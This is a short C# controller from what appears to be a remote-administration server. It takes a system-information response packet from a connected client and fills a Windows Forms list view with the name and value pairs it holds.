using Serveur.Controllers.Server;
using Serveur.Packets.ClientPackets;
using System.Windows.Forms;

namespace Serveur.Controllers
{
    public static class FrmSysInfoController
    {
        public static void getSysInfoResponse(ClientMosaique client, GetSysInfoResponse packet)
        {
            ListViewItem[] lviCollection = new ListViewItem[packet.infoCollection.Length / 2];
            for (int i = 0, j = 0; i < packet.infoCollection.Length; i += 2, j++)
            {
                if (packet.infoCollection[i] != null && packet.infoCollection[i + 1] != null)
                {
                    lviCollection[j] = new ListViewItem(new string[] { packet.infoCollection[i], packet.infoCollection[i + 1] });
                }
            }

            if (client.value != null && client.value.frmSi != null)
                client.value.frmSi.addItems(lviCollection);
        }
    }
}
